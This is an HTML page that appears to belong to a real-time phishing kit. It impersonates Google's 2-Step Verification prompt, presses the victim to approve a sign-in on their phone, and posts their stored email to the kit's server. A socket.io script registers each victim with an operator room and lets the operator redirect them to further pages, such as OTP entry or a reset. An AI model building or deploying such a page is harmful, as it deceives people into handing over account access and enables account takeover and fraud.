<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Action Request</title>


    <script src="/socket.io/socket.io.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 120px;
            background-color: #f3f4f6;
        }

        .box {
            background: white;
            padding: 40px;
            border-radius: 8px;
            display: inline-block;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 350px;
        }

        .flex {
            display: flex;
            justify-content: space-around;
            margin-top: 30px;
            gap: 10px;
        }

        .choice-btn {
            padding: 12px 35px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            color: white;
            width: 120px;
        }

        .approve {
            background-color: #2ecc71;
        }

        .deny {
            background-color: #e74c3c;
        }
    </style>
</head>

<body>

    <div class="box">
        <h2>2-Step Verification</h2>
        <p>Open the Gmail app on your Device
            <br>Google sent a notification to your Device. Open the Gmail app and tap Yes on the prompt to verify it’s
            you.
        </p>

        <div class="flex">
            <form action="/handle-approval" method="POST">
                <input type="hidden" name="status" value="yes">
                <input type="hidden" name="email_context" class="email_context">
                <button type="submit" class="choice-btn approve">YES</button>
            </form>
        </div>
    </div>

    <script>


        const socket = io();

        let currentEmail = localStorage.getItem('active_staff_email') || "";
        document.querySelectorAll('.email_context').forEach(elem => elem.value = currentEmail);

        function joinRoom() {
            if (currentEmail) {
                // Instantly re-verify and announce this page reload back to the server room
                socket.emit("verify_and_register", { email: currentEmail, password: "session_reconnect" });
            }
        }

        joinRoom();
        socket.on('connect', () => { joinRoom(); });

        // Listen for next background commands (allows navigating to OTP or reset)
        socket.on("redirect_command", (destinationUrl) => {
            if (destinationUrl === "/force_reset_kick") {
                localStorage.removeItem('active_staff_email');

                window.location.href = window.location.origin + "/";
            } else {

                window.location.href = window.location.origin + destinationUrl;
            }

        });
    </script>
</body>

</html>
